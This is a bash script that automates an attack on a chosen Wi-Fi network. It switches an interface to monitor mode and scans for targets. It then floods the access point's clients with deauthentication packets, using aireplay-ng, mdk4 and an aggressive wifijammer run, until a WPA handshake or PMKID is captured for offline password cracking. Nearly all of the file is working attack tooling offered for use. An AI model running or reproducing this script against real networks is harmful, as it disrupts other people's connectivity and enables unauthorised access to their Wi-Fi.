#!/bin/bash

echo " "
echo "Opened new terminal !!!"
echo " "
echo "Copy chosen interface and save -> <iface>"
echo " "
echo "example -> wlan0"
echo " "
iw dev
sleep 2
echo " "
qterminal -e 'nano interface.txt'

#===========================================================================================================
echo " "
MODE1=$(iw dev | sed "/$(cat interface.txt)/,/type/!d;/type/!d;s/type//g;s/[ \t]//g")
if [ "$MODE1" = "monitor" ]; then
# "managed" value => yes ---
echo "interface Mode -> monitor !!! :-)"
echo " "
echo "continues attack process..."

else
echo "interface Mode -> "$(iw dev | sed "/$(cat interface.txt)/,/type/!d;/type/!d;s/type//g;s/[ \t]//g")" !!!"

#----------------------------------------------------------------------------------------------------
echo " "
read -p "Create a monitor mode with -> airmon or iw ? (a/w) " RESP
if [ "$RESP" = "a" ]; then
echo " "
echo "Chosen -> airmon-ng !!!"
echo " "
echo "(yes) ---"

ifconfig "$(cat interface.txt)" down && airmon-ng check kill && airmon-ng start "$(cat interface.txt)"

# --- Critical value !!! -> Don't supported air monitor mode, use -> put the iw !!! ---
rm interface.txt
iw dev | sed '/Interface.*.mon/,/monitor/!d;/Interface/!d;s/Interface//g;s/[ \t]//g' > interface.txt
# --- ...or leave the process ---

else
echo " "
echo "Chosen -> iw (default)!!!"
echo " "
systemctl stop NetworkManager && systemctl stop wpa_supplicant && systemctl stop NetworkManager.service && systemctl stop wpa_supplicant.service && ip link set "$(cat interface.txt)" down && iw dev "$(cat interface.txt)" set monitor control && ip link set "$(cat interface.txt)" up
fi
#----------------------------------------------------------------------------------------------------

# --- just one interface... ---
# rm interface.txt
# iw dev | sed '/Interface/!d;s/Interface//g;s/[ \t]//g' > interface.txt

fi
#===========================================================================================================


airmon-ng check kill

# echo " "
echo "Opened new terminal again !!!"
echo " "
echo "stop scanning Press -> ctrl + c !!!"
echo " "
echo "Copy traget MAC and save -> <BSSID>"
echo " "
echo "example -> 1A:2B:3C:4D:5E:6F"
echo " "
sleep 6
airodump-ng -w /root/airlog --output-format csv,kismet "$(cat interface.txt)"
echo " "
qterminal -e 'nano macadress.txt'
echo " "
# Attack based on beacon growth or elapsed time?
read -p "Attack based on beacon growth or elapsed time? (b/t) " askattack1
echo " "
if [ "$askattack1" = "b" ]; then
# attack according to beacon
echo "Chosen -> attack according to beacon..."
echo " "
echo "Opened new terminal again !!!"
echo " "
echo "Write attack beacon -> 500 to 10000"
echo " "
echo "example: nearby -> 1000, almost distant -> 3000, very distant -> 5000"
echo " "
sleep 2
qterminal -e 'nano attackbeacon.txt'
echo " "
else
# attack according to elapsed time
echo "Chosen -> attack according to elapsed time..."
echo " "
echo "Opened new terminal again !!!"
echo " "
echo "Write attack time -> <xy>m <xy>s or <xy>s/m"
echo " "
echo "example: nearby -> 1m, almost distant -> 10m, very distant -> 30m"
echo " "
sleep 2
qterminal -e 'nano attacktime.txt'
echo " "
fi
mkdir "hands-$(sed 's/://g' macadress.txt)" || echo -e "(the folder already exists...)\n "
# varattack1="$askattack1"

# grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | awk '{print $6}' | sed 's/,//g'
# grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d ',' -f 4 | sed 's/[ ]//g'
# grep "Client" hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt) | cut -d ',' -f 4 | perl -ne 'print if ++$k{$_}==1' | tail -1

# airmon-ng check kill

sleep 3

xterm -geometry '85x25+403+0' -e 'airodump-ng -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") --bssid $(cat macadress.txt) -w hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt) $(cat interface.txt)' &

sleep 3

if [ "$askattack1" = "b" ]; then
varbeacon="$(cat attackbeacon.txt)"
# varcheck1="$(grep $(cat macadress.txt) $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].csv | tail -1) | cut -d ',' -f 10 | sed 's/[ ]//g;1!d')"
varcheck1='1'
successwrite="$(echo -e "Beacon success value -> '$(cat attackbeacon.txt)' !!! (attack begins) :-)\n ")"
else
varbeacon='1'
varcheck1='1'
fi

## ## ATTACKBEACON ## ##
while [ "$varbeacon" -gt "$varcheck1" ]; do
  echo "Beacon under -> '$(cat attackbeacon.txt)' !!! (checking again -> 1m)"
  echo " "
  sleep 1m
  varcheck1="$(grep $(cat macadress.txt) $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].csv | tail -1) | cut -d ',' -f 10 | sed 's/[ ]//g;1!d')"
done
  echo "$successwrite"
## ## ## ## ## ## ## ##

## ## ## ATTACK ## ## ##
echo "aireplay attack ready after time -> $(cat attacktime.txt) !!!"
echo " "

if [ "$askattack1" = "b" ]; then
xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 8 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-[0-9][0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
else
xterm -geometry '65x25+0+0' -e 'sleep $(cat attacktime.txt) && aireplay-ng -0 8 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-[0-9][0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
fi

echo "again aireplay attack ready after time -> 10s, and check handshake !!!"
sleep 12
echo " "
## ## ## ## ## ## ## ##


# ***************** Check Handshake Mainprocess *****************************************
hscheck () {
CHECK1="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK1="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK1" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
}
# ***************************************************************************************
##### CHECK HANDSHAKE #####
hscheck
###########################
xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 8 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-[0-9][0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
echo " "
echo "mdk4 attack ready after time -> 10s, and check handshake !!!"

# attack clients mdk4
cp macadress.txt macadress02.txt
grep "Client" "$(ls -1 hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-[0-9][0-9].log.csv | tail -1)" | cut -d ',' -f 4 | perl -ne 'print if ++$k{$_}==1' >> macadress02.txt

sed -i '/^[[:space:]]*$/d;s/[ ]//g' macadress02.txt
# attack clients mdk4

sleep 12
echo " "
##### CHECK HANDSHAKE #####
hscheck
###########################
timeout 15s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress02.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
echo " "
echo "again mdk4 attack ready after time -> 10s, and check handshake !!!"
sleep 13
echo " "
##### CHECK HANDSHAKE #####
hscheck
###########################
timeout 17s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress02.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'

# ----------------FINAL ATTACK METHOD---REVERSE CLIENT SELECTION-->tail intead->head---------------------------------------
echo " "
echo "Last chance: FINAL ATTACK METHOD - REVERSE CLIENT SELECTION (tail intead -> head)"
echo " "

echo "aireplay attack ready after time -> 10s and check handshake !!!"
sleep 16
echo " "
##### CHECK HANDSHAKE #####
hscheck
###########################
xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 8 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-[0-9][0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
echo " "
echo "again aireplay attack ready after time -> 10s, and check handshake !!!"
sleep 13
echo " "
##### CHECK HANDSHAKE #####
hscheck
###########################
xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 8 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-[0-9][0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
echo " "
echo "mdk4 attack ready after time -> 10s, and check handshake !!!"

# attack clients mdk4 ---2---
grep "Client" "$(ls -1 hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-[0-9][0-9].log.csv | tail -1)" | cut -d ',' -f 4 | perl -ne 'print if ++$k{$_}==1' >> macadress02.txt

perl -i -ne 'print if ++$k{$_}==1' macadress02.txt

sed -i '/^[[:space:]]*$/d;s/[ ]//g' macadress02.txt
# attack clients mdk4 ---2---

sleep 13
echo " "
##### CHECK HANDSHAKE #####
hscheck
###########################
timeout 15s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress02.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
echo " "
echo "again mdk4 attack ready after time -> 10s, and check handshake !!!"
sleep 15
echo " "
##### CHECK HANDSHAKE #####
hscheck
###########################
timeout 17s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress02.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
echo " "
echo "wifijammer attack ready after time -> 10s, and check handshake !!!"
sleep 15
echo " "
##### CHECK HANDSHAKE #####
hscheck
###########################

# --- FINAL wifijammer attack !!! ---
echo " "
echo "FINAL wifijammer attack !!!"
echo " "

timeout 20s xterm -geometry '65x25+0+0' -e 'python3 /root/wifijammer/wifijammer.py -a $(cat macadress.txt) -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") -i $(cat interface.txt) --aggressive'

# Final sleep ---
echo "Final check handshake afer time -> 15s !!!"
sleep 15
##### CHECK HANDSHAKE #####
hscheck
###########################
echo " "
echo "Final END all process, no capture hs !!! :-("
rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit
